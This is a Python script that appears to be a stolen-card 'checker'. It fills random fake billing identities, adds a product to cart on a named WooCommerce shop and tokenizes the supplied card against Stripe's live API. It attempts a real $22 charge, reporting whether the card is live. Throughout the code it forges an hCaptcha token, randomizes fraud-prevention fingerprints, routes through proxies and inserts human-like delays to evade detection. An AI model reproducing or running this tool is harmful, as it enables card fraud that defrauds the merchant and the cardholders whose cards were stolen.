import aiohttp
import re
import random
import string
import time
import asyncio
from bs4 import BeautifulSoup
import json

async def human_delay(min_sec=0.5, max_sec=2.5):
    await asyncio.sleep(random.uniform(min_sec, max_sec))

def random_email():
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'mail.com', 'proton.me']
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    surname = ''.join(random.choices(string.ascii_lowercase, k=6))
    num = random.randint(10, 999)
    return f"{name}{surname}{num}@{random.choice(domains)}"

def random_fingerprint():
    return ''.join(random.choices('abcdef0123456789', k=32))

first_names = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph', 'Thomas', 'Charles',
               'Mary', 'Patricia', 'Jennifer', 'Linda', 'Elizabeth', 'Susan', 'Jessica', 'Sarah', 'Karen', 'Nancy']
last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez',
              'Hernandez', 'Lopez', 'Gonzalez', 'Wilson', 'Anderson', 'Thomas', 'Taylor', 'Moore', 'Jackson', 'Martin']
streets = ['Main St', 'Oak Ave', 'Maple Dr', 'Cedar Ln', 'Pine Rd', 'Elm St', 'Washington Ave', 'Lake Dr']
cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego', 'Dallas', 'San Jose']
states = ['NY', 'CA', 'TX', 'FL', 'IL', 'PA', 'OH', 'GA', 'NC', 'MI']
zip_codes = ['10001', '90210', '77001', '33101', '60601', '19101', '44101', '30301', '27601', '48101']

async def process_stripe(cc, mm, yy, cvc, proxy_url=None):
    """
    Processes a card through the WooCommerce Stripe (WCPay) endpoint.
    Returns: (is_live, message, response_text, receipt_url, amount)
    """
    try:
        first_name = random.choice(first_names)
        last_name = random.choice(last_names)
        email = random_email()
        street_num = random.randint(100, 9999)
        street = random.choice(streets)
        city = random.choice(cities)
        state = random.choice(states)
        zip_code = random.choice(zip_codes)
        fingerprint = random_fingerprint()

        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=45)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as s:
            
            # 1. Add to cart
            headers_cart = {
                'host': 'sp12shop.com',
                'cache-control': 'max-age=0',
                'sec-ch-ua': '"Android WebView";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Linux; Android 16; 2409BRN2CA Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.7827.91 Mobile Safari/537.36',
                'origin': 'https://sp12shop.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'referer': 'https://sp12shop.com/product/chief-football-shirt-taylors-boyfriend-version-swiftie-era-fan-tee-shirts/',
                'accept-language': 'en-US;q=0.8,en;q=0.7',
            }
            
            # Using multipart/form-data for WooCommerce cart
            form = aiohttp.FormData()
            form.add_field('attribute_colour', 'White')
            form.add_field('attribute_size', 'Unisex - S')
            form.add_field('attribute_size', 'Unisex - S') # duplicate in original script
            form.add_field('quantity', '1')
            form.add_field('add-to-cart', '68788')
            form.add_field('product_id', '68788')
            form.add_field('variation_id', '68789')
            
            await s.post(
                'https://sp12shop.com/product/chief-football-shirt-taylors-boyfriend-version-swiftie-era-fan-tee-shirts/',
                headers=headers_cart,
                data=form,
                proxy=proxy_url
            )
            
            await human_delay()
            
            # 2. Get Cart / Nonce
            headers_get_cart = {
                'host': 'sp12shop.com',
                'upgrade-insecure-requests': '1',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'user-agent': headers_cart['user-agent'],
            }
            
            async with s.get('https://sp12shop.com/cart/', headers=headers_get_cart, proxy=proxy_url) as r:
                resp_text = await r.text()
                
            non_match = re.search(r'"nonce":"([^"]+)"', resp_text)
            if not non_match:
                return False, "Failed to get cart nonce (site might be down or blocked)", "", None, "Unknown"
            non = non_match.group(1)
            
            await human_delay()
            
            # 3. Simulate Cart
            headers_sim = {
                'host': 'sp12shop.com',
                'user-agent': headers_cart['user-agent'],
                'content-type': 'application/json',
                'accept': '*/*',
                'origin': 'https://sp12shop.com',
                'referer': 'https://sp12shop.com/product/chief-football-shirt-taylors-boyfriend-version-swiftie-era-fan-tee-shirts/',
            }
            
            json_sim = {
                'nonce': non,
                'products': [
                    {
                        'id': '68788',
                        'quantity': '1',
                        'variations': [
                            {'value': 'White', 'name': 'attribute_colour'},
                            {'value': 'Unisex - S', 'name': 'attribute_size'},
                        ],
                        'extra': {},
                    },
                ],
            }
            
            await s.post('https://sp12shop.com', params={'wc-ajax': 'ppc-simulate-cart'}, headers=headers_sim, json=json_sim, proxy=proxy_url)
            
            await human_delay()
            
            # 4. Get Checkout Nonces
            async with s.get('https://sp12shop.com/checkout/', headers=headers_get_cart, proxy=proxy_url) as r:
                checkout_text = await r.text()
                
            try:
                sig = re.search(r'woopaySignatureNonce%22%3A%22([^%]+)', checkout_text).group(1)
                ses = re.search(r'woopaySessionNonce%22%3A%22([^%]+)', checkout_text).group(1)
            except Exception:
                # Often woopay tokens might not appear if standard Stripe is used instead, but the script relies on it.
                sig = "fallback_sig"
                ses = "fallback_ses"
                
            checkout_nonce = re.search(r'"nonce":"([^"]+)"', checkout_text)
            checkout_nonce = checkout_nonce.group(1) if checkout_nonce else 'f6dbe70d66'
            
            await human_delay()
            
            # 5. Get Woopay Signature
            if sig != "fallback_sig":
                form_sig = aiohttp.FormData()
                form_sig.add_field('_ajax_nonce', sig)
                
                async with s.post('https://sp12shop.com', params={'wc-ajax': 'wcpay_get_woopay_signature'}, headers=headers_sim, data=form_sig, proxy=proxy_url) as r:
                    try:
                        sig_json = await r.json()
                        signature = sig_json['data']['signature']
                    except Exception:
                        pass
            
            await human_delay()
            
            # 6. Stripe Tokenization (Direct API)
            guid = ''.join(random.choices('abcdef0123456789', k=32))
            muid = ''.join(random.choices('abcdef0123456789', k=32))
            sid = ''.join(random.choices('abcdef0123456789', k=32))
            client_session = ''.join(random.choices('abcdef0123456789-', k=36))
            elements_session = ''.join(random.choices('abcdef0123456789', k=20))
            hcaptcha_token = 'P1_' + ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=500))
            
            headers_stripe = {
                'host': 'api.stripe.com',
                'user-agent': headers_cart['user-agent'],
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
            }
            
            stripe_data = (
                f'billing_details[name]={first_name}+{last_name}'
                f'&billing_details[email]={email}'
                f'&billing_details[phone]='
                f'&billing_details[address][city]={city}'
                f'&billing_details[address][country]=US'
                f'&billing_details[address][line1]={street_num}+{street.replace(" ", "+")}'
                f'&billing_details[address][line2]='
                f'&billing_details[address][postal_code]={zip_code}'
                f'&billing_details[address][state]={state}'
                f'&type=card'
                f'&card[number]={cc}'
                f'&card[cvc]={cvc}'
                f'&card[exp_year]={yy}'
                f'&card[exp_month]={mm}'
                f'&allow_redisplay=unspecified'
                f'&payment_user_agent=stripe.js%2F39914d4bef%3B+stripe-js-v3%2F39914d4bef%3B+payment-element%3B+deferred-intent'
                f'&referrer=https%3A%2F%2Fsp12shop.com'
                f'&time_on_page={random.randint(15000, 60000)}'
                f'&client_attribution_metadata[client_session_id]={client_session}'
                f'&client_attribution_metadata[merchant_integration_source]=elements'
                f'&client_attribution_metadata[merchant_integration_subtype]=payment-element'
                f'&client_attribution_metadata[merchant_integration_version]=2021'
                f'&client_attribution_metadata[payment_intent_creation_flow]=deferred'
                f'&client_attribution_metadata[payment_method_selection_flow]=merchant_specified'
                f'&client_attribution_metadata[elements_session_id]=elements_session_{elements_session}'
                f'&client_attribution_metadata[elements_session_config_id]={"".join(random.choices("abcdef0123456789-", k=36))}'
                f'&client_attribution_metadata[merchant_integration_additional_elements][0]=payment'
                f'&guid={guid}'
                f'&muid={muid}'
                f'&sid={sid}'
                f'&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs'
                f'&radar_options[hcaptcha_token]={hcaptcha_token}'
            )
            
            async with s.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=stripe_data, proxy=proxy_url) as r:
                stripe_json = await r.json()
                
            if 'error' in stripe_json:
                err_msg = stripe_json['error'].get('message', 'Unknown Stripe Error')
                err_code = stripe_json['error'].get('code', stripe_json['error'].get('decline_code', ''))
                if err_code:
                    err_msg += f" ({err_code})"
                    
                # Standard decline handling
                if any(x in err_msg.lower() for x in ['insufficient funds', 'do not honor', 'cvc was incorrect']):
                    return False, f"Declined - {err_msg}", err_msg, None, "$22.00"
                    
                return False, f"Stripe Tokenization Failed: {err_msg}", err_msg, None, "$22.00"
                
            pm = stripe_json.get('id')
            if not pm:
                return False, "Failed to get PaymentMethod ID from Stripe", str(stripe_json), None, "$22.00"
                
            await human_delay()
            
            # 7. Final Checkout
            headers_checkout = {
                'host': 'sp12shop.com',
                'nonce': '126b20a63c', # Hardcoded in original, though likely tied to session
                'pragma': 'no-cache',
                'cache-control': 'no-cache',
                'x-wp-nonce': checkout_nonce,
                'user-agent': headers_cart['user-agent'],
                'accept': 'application/json, */*;q=0.1',
                'content-type': 'application/json',
                'origin': 'https://sp12shop.com',
                'referer': 'https://sp12shop.com/checkout/',
            }
            
            session_pages = str(random.randint(5, 20))
            session_count = str(random.randint(1, 3))
            
            checkout_json_data = {
                'additional_fields': {},
                'billing_address': {
                    'first_name': first_name,
                    'last_name': last_name,
                    'company': '',
                    'address_1': f'{street_num} {street}',
                    'address_2': '',
                    'city': city,
                    'state': state,
                    'postcode': zip_code,
                    'country': 'US',
                    'email': email,
                    'phone': '',
                },
                'create_account': False,
                'customer_note': '',
                'customer_password': '',
                'extensions': {
                    'woocommerce/order-attribution': {
                        'source_type': 'typein',
                        'session_entry': 'https://sp12shop.com/',
                        'session_start_time': '2026-06-25 19:26:30',
                        'session_pages': session_pages,
                        'session_count': session_count,
                        'user_agent': headers_cart['user-agent'],
                    },
                },
                'shipping_address': {
                    'first_name': first_name,
                    'last_name': last_name,
                    'company': '',
                    'address_1': f'{street_num} {street}',
                    'address_2': '',
                    'city': city,
                    'state': state,
                    'postcode': zip_code,
                    'country': 'US',
                    'phone': '',
                },
                'payment_method': 'woocommerce_payments',
                'payment_data': [
                    {'key': 'payment_method', 'value': 'woocommerce_payments'},
                    {'key': 'wcpay-payment-method', 'value': pm},
                    {'key': 'wcpay-fraud-prevention-token', 'value': ''},
                    {'key': 'wcpay-fingerprint', 'value': fingerprint},
                    {'key': 'wc-woocommerce_payments-new-payment-method', 'value': False},
                ],
            }
            
            async with s.post('https://sp12shop.com/wp-json/wc/store/v1/checkout', params={'_locale': 'site'}, headers=headers_checkout, json=checkout_json_data, proxy=proxy_url) as r:
                try:
                    res_json = await r.json()
                except Exception:
                    raw_text = await r.text()
                    return False, f"JSON Decode Error at Checkout", raw_text, None, "$22.00"
                    
            if 'payment_result' in res_json:
                result = res_json['payment_result']
                status = result.get('payment_status', 'failed')
                
                if status == 'success':
                    return True, "Charged (success)", str(res_json), None, "$22.00"
                
                # Check for specific decline messages inside payment_details
                details_msg = ""
                if 'payment_details' in result:
                    details = result['payment_details']
                    if isinstance(details, list) and len(details) > 0:
                        if isinstance(details[0], dict):
                            details_msg = details[0].get('message', '')
                        else:
                            details_msg = str(details[0])
                            
                err_msg = res_json.get('message', 'Failed')
                if details_msg:
                    err_msg += f" - {details_msg}"
                
                if "insufficient funds" in err_msg.lower() or "do not honor" in err_msg.lower():
                    return False, f"Declined - {err_msg}", str(res_json), None, "$22.00"
                    
                return False, f"Failed - {err_msg}", str(res_json), None, "$22.00"
                
            elif 'message' in res_json:
                return False, f"Error: {res_json['message']}", str(res_json), None, "$22.00"
            else:
                return False, "Unknown Checkout Response", str(res_json), None, "$22.00"
                
    except Exception as e:
        return False, f"Exception: {str(e)}", "", None, "$22.00"
